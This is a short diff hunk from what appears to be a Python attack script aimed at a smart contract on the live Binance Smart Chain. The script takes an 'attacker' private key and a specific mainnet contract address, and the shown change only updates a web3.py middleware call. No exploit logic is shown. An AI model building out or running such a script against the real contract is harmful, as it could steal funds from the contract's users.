@@ -13,7 +13,7 @@ attacker_private_key = sys.argv[1]
 
 # Connect to BSC
 w3 = Web3(Web3.HTTPProvider("https://bsc-dataseed.binance.org"))
-w3.middleware_stack.inject(geth_poa_middleware, layer=0)
+w3.middleware_onion.inject(geth_poa_middleware, layer=0)
 
 # Contract setup
 contract_address = "0xc461CE1893895ea6eA3dacFe03dbd14120BFf8ba"
